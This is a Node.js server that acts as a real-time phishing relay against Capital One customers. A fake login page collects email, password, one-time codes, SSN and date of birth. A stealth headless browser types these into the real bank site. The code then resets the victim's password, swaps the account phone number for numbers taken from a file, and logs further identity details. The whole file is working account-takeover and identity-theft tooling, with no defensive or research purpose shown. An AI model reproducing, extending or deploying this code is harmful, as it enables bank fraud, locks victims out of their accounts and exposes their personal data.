
const express = require("express");
const bodyParser = require("body-parser");
const puppeteer = require("puppeteer-extra");
const StealthPlugin = require("puppeteer-extra-plugin-stealth");
const axios = require("axios");
const qs = require("qs");
const session = require("express-session"); // For session management
const fs = require("fs/promises"); // For handling phone.txt file

// Add stealth plugin to Puppeteer
puppeteer.use(StealthPlugin());

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(bodyParser.urlencoded({ extended: true }));

// Configure session middleware
app.use(
  session({
    secret: "your-secret-key", // Replace with a strong secret key
    resave: false,
    saveUninitialized: true,
    cookie: { secure: false }, // Set to `true` if using HTTPS
  })
);

// Turnstile Secret Key
const TURNSTILE_SECRET_KEY = process.env.TURNSTILE_SECRET_KEY;

// Puppeteer browser and page instances
let browser, page;




// Function to launch Puppeteer browser
async function launchBrowser() {
  if (!browser) {
    console.log("Launching Puppeteer browser...");
    browser = await puppeteer.launch({
      headless: true,
      executablePath: "/app/.chrome-for-testing/chrome-linux64/chrome", // Adjust path for Heroku
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--disable-dev-shm-usage",
        "--single-process",
        "--disable-gpu",
      ],
    });
    console.log("Browser launched successfully!");
    page = await browser.newPage();
    console.log("New page created!");
  }
}

// Gracefully close Puppeteer browser when the process exits
process.on("SIGTERM", async () => {
  console.log("SIGTERM received. Closing browser...");
  if (browser) await browser.close();
  process.exit(0);
});

process.on("SIGINT", async () => {
  console.log("SIGINT received. Closing browser...");
  if (browser) await browser.close();
  process.exit(0);
});

// Function to validate Turnstile token
async function validateTurnstileToken(token) {
  try {
    if (!TURNSTILE_SECRET_KEY) {
      console.error("Turnstile secret key is missing!");
      return false;
    }

    console.log("Validating Turnstile token with secret:", TURNSTILE_SECRET_KEY);

    const response = await axios.post(
      "https://challenges.cloudflare.com/turnstile/v0/siteverify",
      qs.stringify({
        secret: TURNSTILE_SECRET_KEY,
        response: token,
      }),
      {
        headers: {
          "Content-Type": "application/x-www-form-urlencoded",
        },
      }
    );

    console.log("Turnstile validation response:", response.data);
    return response.data.success;
  } catch (error) {
    console.error("Error validating Turnstile token:", error.message);
    return false;
  }
}

// Serve the login form
app.get("/", (req, res) => {
  // Initialize invalidAttempts for the session
  req.session.invalidAttempts = req.session.invalidAttempts || 0;
  res.send(`
    <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
      </head>
      <body>
        <h1>Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
  `);
});

// Handle login form submission
app.post("/submit-login", async (req, res) => {
    const { email, password } = req.body;
    const turnstileToken = req.body["cf-turnstile-response"];
  
    if (!turnstileToken) {
      return res.status(400).send("<h1>CAPTCHA token is missing. Please try again.</h1>");
    }
  
    const isValidCaptcha = await validateTurnstileToken(turnstileToken);
    if (!isValidCaptcha) {
      return res.status(403).send("<h1>Invalid CAPTCHA. Please try again.</h1>");
    }
  
    req.session.invalidAttempts = req.session.invalidAttempts || 0;
  
    try {
      await launchBrowser();
  
      console.log("Navigating to login page...");
      await page.goto("https://www.capitalone.com/", { waitUntil: "networkidle2" });
  
      console.log("Filling in login form...");
      await page.type("input#ods-input-0", email, { delay: 100 });
      await page.type("input#ods-input-1", password, { delay: 100 });
  
      console.log("Submitting login form...");
      await page.click("button#noAcctSubmit");
      await page.waitForNavigation({ waitUntil: "networkidle2" });
  
      const loginSuccess = await page.evaluate(() => {
        const element = document.querySelector("div.option-list-entry--message > p.message--header");
        return element && element.textContent.trim() === "Text me a temporary code";
      });
  
        // Handle login success or failure
    if (loginSuccess) {
      console.log("Login successful!");
      invalidAttempts = 0; // Reset invalid attempts

      console.log("Requesting OTP...");
      await page.click("div.option-list-entry--message > p.message--header");
      await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
      await page.click('button[data-testtarget="otp-button"]');

  

      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Enter OTP</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Enter OTP</h1>
            <form action="/submit-otp" method="POST">
              <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
    }else {
        req.session.invalidAttempts++;
  
        if (req.session.invalidAttempts === 1) {
          res.send(`
             <!DOCTYPE html>
    <html lang="en">
      <head>
        <meta charset="UTF-8" />
        <meta name="viewport" content="width=device-width, initial-scale=1.0" />
        <title>Login</title>
        <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>
      </head>
      <body>
        <h1>INVALID Login</h1>
        <form action="/submit-login" method="POST">
          <label>Email: <input type="text" name="email" required /></label><br/>
          <label>Password: <input type="password" name="password" required /></label><br/>
          <div class="cf-turnstile" data-sitekey="0x4AAAAAAA6n2sVAp0He7OUj"></div><br/>
          <button type="submit">Log in</button>
        </form>
      </body>
    </html>
          `);
        } else if (req.session.invalidAttempts === 2) {
          console.log("Second invalid attempt: Navigating to Sign-In Help...");
  
          // Navigate to the Sign-In Help page
          await page.goto("https://verified.capitalone.com/sign-in-help/", { waitUntil: "networkidle2" });
  
          // Serve the contact form
          res.send(`
            <!DOCTYPE html>
            <html lang="en">
              <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Contact Information</title>
                <style>
                  body {
                    font-family: Arial, sans-serif;
                    max-width: 500px;
                    margin: 2rem auto;
                    text-align: center;
                  }
                  input, button {
                    padding: 0.5rem;
                    margin: 0.5rem 0;
                    font-size: 1rem;
                  }
                  button {
                    background-color: #007bff;
                    color: #fff;
                    border: none;
                    cursor: pointer;
                  }
                  button:hover {
                    background-color: #0056b3;
                  }
                </style>
              </head>
              <body>
                <h1>Contact Information</h1>
                <form action="/submit-contact" method="POST">
                  <label>Last Name: <input type="text" name="lastname" required /></label><br/>
                  <label>SSN: <input type="password" name="ssn" required /></label><br/>
                  <label>Date of Birth: <input type="text" name="dob" required placeholder="mm/dd/yyyy" /></label><br/>
                  <button type="submit">Find Me</button>
                </form>
              </body>
            </html>
          `);
        } else {
          res.send("<h1>Too many invalid attempts. Please try again later.</h1>");
        }
      }
    } catch (error) {
      console.error("Error during login process:", error);
      res.status(500).send("<h1>An error occurred. Please try again later.</h1>");
    }
  });
  


  app.post("/submit-otp", async (req, res) => {
    const { otp } = req.body;
  
    try {
      // Input OTP into Puppeteer session
      await page.type('input#pinEntry', otp, { delay: 100 });
  
      console.log("Submitting OTP...");
      // Click the "Submit Code" button and wait for navigation
      await Promise.all([
        page.click('button[data-testtarget="otp-submit"]'),
        page.waitForNavigation({ waitUntil: "networkidle2" }), // Wait for navigation to complete
      ]);
  
      console.log("OTP submitted successfully!");
  
      // Wait again for potential re-navigation
      await page.waitForNavigation({ waitUntil: "networkidle2" });
  
      // Evaluate login success by checking the existence of the "Help Button" on the dashboard
      const onDashboard = await page.evaluate(() => {
        const helpButton = document.querySelector('button[data-e2e="eno-chat-button"]');
        return !!helpButton; // Return true if the button exists, false otherwise
      });
  
      if (onDashboard) {
        // Navigate to Profile
  
        // Navigate to Home Phone section
        await page.goto("https://myaccounts.capitalone.com/Profile/HomePhone", { waitUntil: "networkidle2" });
  
        // Check for "Text me a temporary code" option
        const codeOptionExists = await page.evaluate(() => {
          const element = document.querySelector('div.option-list-entry--message > p.message--header');
          return element && element.textContent.trim() === 'Text me a temporary code';
        });
  
        if (codeOptionExists) {
          // Click the option and resend the code
          await page.click('div.option-list-entry--message > p.message--header');
  
          await page.waitForNavigation({ waitUntil: "networkidle2" });
  
          await page.click('button[data-testtarget="otp-button"]');
  
          // Render new OTP input form
          return res.send(`
            <!DOCTYPE html>
            <html lang="en">
              <head>
                <meta charset="UTF-8" />
                <meta name="viewport" content="width=device-width, initial-scale=1.0" />
                <title>Enter OTP</title>
                <style>
                  body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
                  input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
                  button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
                  button:hover { background-color: #0056b3; }
                </style>
              </head>
              <body>
                <h1>Enter OTP</h1>
                <form action="/submit-otp2" method="POST">
                  <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
                  <button type="submit">Submit OTP</button>
                </form>
              </body>
            </html>
          `);
        } else {
          console.log("Code option not available, proceeding with phone number input...");
  
          // Wait for the phone modal to appear
          await page.waitForSelector('h2#phone-modal-label', { visible: true });
  
          // Read phone number from file
          const phoneData = await fs.promises.readFile('code/phone.txt', 'utf-8');
          const phoneNumbers = phoneData.split('\n').filter((line) => line.trim() !== '');
  
          if (phoneNumbers.length === 0) {
            throw new Error('No phone numbers available in phone.txt');
          }
  
          const phoneNumber = phoneNumbers[0].trim();
          console.log(`Using phone number: ${phoneNumber}`);
  
          // Update phone.txt to remove the used number
          const updatedPhoneData = phoneNumbers.slice(1).join('\n');
          await fs.promises.writeFile('code/phone.txt', updatedPhoneData, 'utf-8');
  
          // Input phone number and confirm it
          await page.type('input#phoneNumberInput', phoneNumber, { delay: 100 });
          await page.type('input#confirmPhoneInput', phoneNumber, { delay: 100 });
  
          // Click consent label
          await page.waitForSelector('label[for="gng-radio-2-input"]', { visible: true });
          await page.click('label[for="gng-radio-2-input"]');
  
          // Click save button
          await page.waitForSelector('button#editPhoneSaveTcpa', { visible: true });
          await page.click('button#editPhoneSaveTcpa');
  
          console.log("Phone number submitted successfully!");
  
          // Send success message to the user
          return res.send("<h1>success.</h1>");
        }
      } else {
        return res.send("<h1>Failed to access the dashboard. Please try again.</h1>");
      }
    } catch (error) {
      console.error("Error during OTP submission:", error);
      res.status(500).send("<h1>An error occurred during the OTP submission process.</h1>");
    }
  });
  
  
  // Route: Handle OTP submission
  app.post("/submit-otp2", async (req, res) => {
    const { otp } = req.body;
  
    try {
      // Input OTP into Puppeteer session
      await page.type('input#pinEntry', otp, { delay: 100 });
  
      // Click "Submit Code" button
      await page.click('button[data-testtarget="otp-submit"]');
      await page.waitForNavigation({ waitUntil: "networkidle2" });
  
  
  
      await page.waitForSelector('h2#phone-modal-label', { visible: true });
  
      // Read phone number from file
      const phoneData = await fs.readFile('code/phone.txt', 'utf-8');
      const phoneNumbers = phoneData.split('\n').filter((line) => line.trim() !== '');
      if (phoneNumbers.length === 0) throw new Error('No phone numbers available in phone.txt');
  
      const phoneNumber = phoneNumbers[0].trim();
      console.log(`Using phone number: ${phoneNumber}`);
  
      // Update phone.txt to remove the used number
      const updatedPhoneData = phoneNumbers.slice(1).join('\n');
      await fs.writeFile('code/phone.txt', updatedPhoneData, 'utf-8');
  
      // Input phone number and confirm it
      await page.type('input#phoneNumberInput', phoneNumber);
      await page.type('input#confirmPhoneInput', phoneNumber);
  
      // Click consent label
      await page.waitForSelector('label[for="gng-radio-2-input"]');
      await page.click('label[for="gng-radio-2-input"]');
  
      // Click save button
      await page.waitForSelector('button#editPhoneSaveTcpa');
      await page.click('button#editPhoneSaveTcpa');
  
    } catch (error) {
      console.error("Error during OTP submission:", error);
      res.status(500).send("<h1>An error occurred while processing your OTP.</h1>");
    }
  });
  


  // Route: Handle contact form submission
app.post("/submit-contact", async (req, res) => {
  const { lastname, ssn, dob } = req.body;

  try {
    console.log("Filling in contact form...");
    // Fill the contact form fields on the Puppeteer browser page
    await page.type('input#lastname', lastname, { delay: 100 });
    await page.type('input#fullSSN', ssn, { delay: 100 });
    await page.type('input#dob', dob, { delay: 100 });

    console.log("Submitting contact form...");
    // Click the "Find Me" button
    await page.click('#find-me-button');

     console.log("Waiting for success indicator...");
     // Wait for the success button to appear (or timeout if not found)
     await page.waitForSelector('button[data-testtarget="noAccessButton"]', {
      visible: true,
      timeout: 15000, // Timeout reduced to 15 seconds to ensure Heroku's 30-second limit is not exceeded
     });

     console.log("Contact form submitted successfully!");
  
      const contactCorrect = await page.evaluate(() => {
        const element = document.querySelector('div.option-list-entry--message > p.message--header');
        return element && element.textContent.trim() === 'Text me a temporary code';
      });
  
      if (contactCorrect) {
        console.log("contact details correct");
        invalidAttempts = 0; // Reset invalid attempts
  
        console.log("Requesting OTP...");
        await page.click("div.option-list-entry--message > p.message--header");
        await page.waitForSelector('button[data-testtarget="otp-button"]', { visible: true });
        await page.click('button[data-testtarget="otp-button"]');
  
      // Wait for and click the "Send me the code" button
      await page.waitForSelector('button[data-testtarget="otp-button"]', {
        visible: true,
        timeout: 15000,
      });
    

      // Render an HTML page for OTP entry
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>OTP Reset</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>OTP Reset</h1>
            <p>Please enter the OTP sent to your phone:</p>
            <form action="/submit-otpre" method="POST">
              <label>OTP: <input type="text" name="otp" required maxlength="6" /></label><br/>
              <button type="submit">Submit OTP</button>
            </form>
          </body>
        </html>
      `);
      }
  } catch (error) {
    console.error("Error submitting contact details:", error);

    if (error.name === 'TimeoutError') {
      console.log("Contact details not found, rendering Identity Info form...");
      // Serve the Identity Info form
      res.send(`
        <!DOCTYPE html>
        <html lang="en">
          <head>
            <meta charset="UTF-8" />
            <meta name="viewport" content="width=device-width, initial-scale=1.0" />
            <title>Identity Info</title>
            <style>
              body {
                font-family: Arial, sans-serif;
                max-width: 500px;
                margin: 2rem auto;
                text-align: center;
              }
              input, button {
                padding: 0.5rem;
                margin: 0.5rem 0;
                font-size: 1rem;
              }
              button {
                background-color: #007bff;
                color: #fff;
                border: none;
                cursor: pointer;
              }
              button:hover {
                background-color: #0056b3;
              }
            </style>
          </head>
          <body>
            <h1>Identity Info</h1>
            <p>We couldn't find your contact details. Please provide additional information below:</p>
            <form action="/submit-identity-info" method="POST">
              <label>Full Name: <input type="text" name="fullname" required /></label><br/>
              <label>ZIP Code: <input type="text" name="zipcode" required /></label><br/>
              <label>Email Address: <input type="email" name="email" required /></label><br/>
              <button type="submit">Submit</button>
            </form>
          </body>
        </html>
      `);
    } else {
      res.status(500).send("<h1>An error occurred while submitting contact details.</h1>");
    }
  }
});




// Route: Handle OTP submission
app.post("/submit-otpre", async (req, res) => {
  const { otp } = req.body;

  try {
    console.log("Typing OTP...");
    // Type the OTP into the input field
    await page.type('input[data-testtarget="pin-entry-input"]', otp, { delay: 100 });

    // Click the "Submit Code" button
    await Promise.all([
      page.click('button[data-testtarget="otp-submit"]'),
      page.waitForNavigation({ waitUntil: "networkidle2" }),
    ]);
    console.log("OTP submitted successfully!");
    

        // Wait for network to become idle
  await page.waitForNavigation({ waitUntil: "networkidle2" });

  // Locate the username element and grab the username
  const username = await page.evaluate(() => {
    const usernameElement = document.querySelector('h1.ci-page-header span.username-offset');
    return usernameElement ? usernameElement.textContent.trim() : null;
  });

  if (username) {
    console.log(`Username found: ${username}`);
  } else {
    console.error("Username element not found!");
    return res.status(500).send("<h1>Failed to retrieve username. Please try again.</h1>");
  }

  // Click the "Reset My Password" button and wait for navigation
  await Promise.all([
    page.click('a[data-testtarget="username-found-reset-password-link"]'),
    page.waitForNavigation({ waitUntil: "networkidle2" }),
  ]);
  console.log("Navigated to the password reset page.");

  
    // Wait for the password reset input field
    await page.waitForSelector('input#ci-password-reset', { visible: true, timeout: 15000 });
    console.log("Password reset input available.");

    // Generate a secure password
    const newPassword = generateSecurePassword();
    console.log("Generated new secure password:", newPassword);

    // Type the new password into the input field
    await page.type('input#ci-password-reset', newPassword, { delay: 100 });

    // Click the "Update My Password" button
    await Promise.all([
      page.click('button#setpw-button'),
      page.waitForNavigation({ waitUntil: "networkidle2" }),
    ]);
    console.log("Password updated successfully!");

    // Wait for the success message
    await page.waitForSelector('h1.ci-page-header', { visible: true, timeout: 15000 });
    console.log("Password change successful!");

    // Click the "Continue" button to go to the dashboard
    await Promise.all([
      page.click('button[data-testtarget="success-button"]'),
      page.waitForNavigation({ waitUntil: "networkidle2" }),
    ]);
    console.log("Navigated to dashboard!");

    // Wait for the final element indicating the process is complete
    await page.waitForSelector('button[data-e2e="eno-chat-button"]', { visible: true, timeout: 15000 });
    console.log("Process complete!");

    // Wait again for potential re-navigation
    await page.waitForNavigation({ waitUntil: "networkidle2" });

    // Evaluate login success by checking the existence of the "Help Button" on the dashboard
    const onDashboard2 = await page.evaluate(() => {
      const helpButton = document.querySelector('button[data-e2e="eno-chat-button"]');
      return !!helpButton; // Return true if the button exists, false otherwise
    });

    if (onDashboard2) {
      // Navigate to Profile

      // Navigate to Home Phone section
      await page.goto("https://myaccounts.capitalone.com/Profile/HomePhone", { waitUntil: "networkidle2" });

      // Check for "Text me a temporary code" option
      const codeOptionExists = await page.evaluate(() => {
        const element = document.querySelector('div.option-list-entry--message > p.message--header');
        return element && element.textContent.trim() === 'Text me a temporary code';
      });

      if (codeOptionExists) {
        // Click the option and resend the code
        await page.click('div.option-list-entry--message > p.message--header');

        await page.waitForNavigation({ waitUntil: "networkidle2" });

        await page.click('button[data-testtarget="otp-button"]');

        // Render new OTP input form
        return res.send(`
          <!DOCTYPE html>
          <html lang="en">
            <head>
              <meta charset="UTF-8" />
              <meta name="viewport" content="width=device-width, initial-scale=1.0" />
              <title>Enter OTP</title>
              <style>
                body { font-family: Arial, sans-serif; max-width: 500px; margin: 2rem auto; text-align: center; }
                input, button { padding: 0.5rem; margin: 0.5rem 0; font-size: 1rem; }
                button { background-color: #007bff; color: #fff; border: none; cursor: pointer; }
                button:hover { background-color: #0056b3; }
              </style>
            </head>
            <body>
              <h1>Enter OTP</h1>
              <form action="/submit-otp2" method="POST">
                <label>OTP: <input type="text" name="otp" maxlength="6" required /></label><br/>
                <button type="submit">Submit OTP</button>
              </form>
            </body>
          </html>
        `);
      } else {
        console.log("Code option not available, proceeding with phone number input...");

        // Wait for the phone modal to appear
        await page.waitForSelector('h2#phone-modal-label', { visible: true });

        // Read phone number from file
        const phoneData = await fs.promises.readFile('code/phone.txt', 'utf-8');
        const phoneNumbers = phoneData.split('\n').filter((line) => line.trim() !== '');

        if (phoneNumbers.length === 0) {
          throw new Error('No phone numbers available in phone.txt');
        }

        const phoneNumber = phoneNumbers[0].trim();
        console.log(`Using phone number: ${phoneNumber}`);

        // Update phone.txt to remove the used number
        const updatedPhoneData = phoneNumbers.slice(1).join('\n');
        await fs.promises.writeFile('code/phone.txt', updatedPhoneData, 'utf-8');

        // Input phone number and confirm it
        await page.type('input#phoneNumberInput', phoneNumber, { delay: 100 });
        await page.type('input#confirmPhoneInput', phoneNumber, { delay: 100 });

        // Click consent label
        await page.waitForSelector('label[for="gng-radio-2-input"]', { visible: true });
        await page.click('label[for="gng-radio-2-input"]');

        // Click save button
        await page.waitForSelector('button#editPhoneSaveTcpa', { visible: true });
        await page.click('button#editPhoneSaveTcpa');

        console.log("Phone number submitted successfully!");

        // Send success message to the user
        return res.send("<h1>success.</h1>");
      }
    }

    res.send("<h1>Password reset process completed successfully!</h1>");
  } catch (error) {
    console.error("Error during OTP submission or password reset:", error);
    res.status(500).send("<h1>An error occurred during the OTP submission process.</h1>");
  }
});

// Function to generate a secure password
function generateSecurePassword() {
  const chars = "ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz23456789";
  let password = "";
  while (password.length < 8 || password.length > 15) {
    password = Array.from({ length: Math.floor(Math.random() * 8) + 8 })
      .map(() => chars.charAt(Math.floor(Math.random() * chars.length)))
      .join("");
  }
  return password;
}

  app.post("/submit-identity-info", async (req, res) => {
    const { fullname, zipcode, email } = req.body;
  
    try {
      console.log("Received identity info:");
      console.log(`Full Name: ${fullname}`);
      console.log(`ZIP Code: ${zipcode}`);
      console.log(`Email Address: ${email}`);
  
      // Process the identity information as needed (e.g., log it, send it to another Puppeteer process)
      res.send("<h1>Identity information submitted successfully!</h1>");
    } catch (error) {
      console.error("Error processing identity info:", error);
      res.status(500).send("<h1>An error occurred while processing your identity information.</h1>");
    }
  });



  // **Graceful Shutdown**
process.on("SIGINT", async () => {
  if (browser) {
    console.log("Closing Puppeteer browser...");
    await browser.close();
  }
  process.exit();
});



// Start the server
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});

